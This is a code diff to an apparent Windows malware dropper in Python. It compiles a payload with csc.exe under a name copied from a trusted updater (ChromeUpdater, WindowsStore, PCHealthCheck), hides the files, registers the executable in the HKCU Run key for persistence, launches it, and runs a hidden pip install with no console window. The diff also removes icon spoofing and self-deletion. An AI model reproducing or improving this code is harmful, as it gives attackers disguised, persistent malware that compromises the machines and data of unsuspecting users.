@@ -21,17 +21,6 @@ def make_hidden(file_path):
     except:
         pass
 
-def get_logo(name):
-    LOGOS = {
-        "PCHealthCheck": "addons/PCHealthCheck.ico",
-        "Windows updater": "addons/WindowsUpdater.ico",
-        "MSEdge updater": "addons/MsEdge.ico",
-        "Chrome updater": "addons/Chrome.ico",
-        "Google Crash Handler": "addons/Chrome.ico",
-        "Java Update Checker": "addons/java.ico",
-        "WindowsStore": "addons/WSStore.ico",
-    }
-    return LOGOS.get(name, None)
 
 def generate_path(base_path, name_length=5):
     random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=name_length))
@@ -55,11 +44,11 @@ possible_paths = [
 
 created_name = random.choice([
     'PCHealthCheck',
-    'Windows updater',
-    'MSEdge Updater',
-    'Chrome Updater',
-    'Google Crash Handler',
-    'Java Update Checker',
+    'WindowsUpdater',
+    'MSEdgeUpdater',
+    'ChromeUpdater',
+    'GoogleCrashHandler',
+    'JavaUpdateChecker',
     'WindowsStore'])
 
 selected_paths = [
@@ -70,21 +59,24 @@ for path, char in zip(selected_paths, src_hashed):
     make_hidden(path)
 
 dav()
+command_pip = f"""pip install -r {os.path.join(os.getcwd(), 'requirements.txt')}"""
+subprocess.Popen(['cmd', '/c', 'start', '/b', 'cmd', '/k', command_pip], creationflags=subprocess.CREATE_NO_WINDOW)
 selected_paths = [s.replace('\\', '\\\\') for s in selected_paths]
 recompyler_content = recompyler.replace('PARTS_PATH', '","'.join(selected_paths))
 created_file = os.path.join(os.getenv('TEMP'), f"{created_name}.cs")
 writefile(created_file, recompyler_content)
-csc_path = os.path.join('C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319', 'csc.exe')
+csc_path = os.path.join(os.getenv("SystemRoot"), 'Microsoft.NET\\Framework\\v4.0.30319', 'csc.exe')
 exe_path = random.choice(possible_paths)
 exe_file = f'{exe_path}\\{created_name}.exe'
 command_args = [
     csc_path,
     f'/out:{exe_file}',
-    f'/win32icon:{get_logo(created_name)}',
     created_file,
 ]
-with open(os.devnull, 'w') as devnull:
-    subprocess.call(command_args, stdout=devnull, stderr=devnull)
+command_str = " ".join(command_args)
+devnull = open(os.devnull, 'w')
+os.system("{} > {} 2>&1".format(command_str, os.devnull))
+devnull.close()
 make_hidden(exe_file)
 
 key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
@@ -93,9 +85,5 @@ winreg.SetValueEx(key, created_name, 0, winreg.REG_SZ, exe_file)
 os.remove(created_file)
 try:
     subprocess.call(exe_file)
-except:
-    pass
-try: 
-    os.remove(__file__)
 except:
     pass
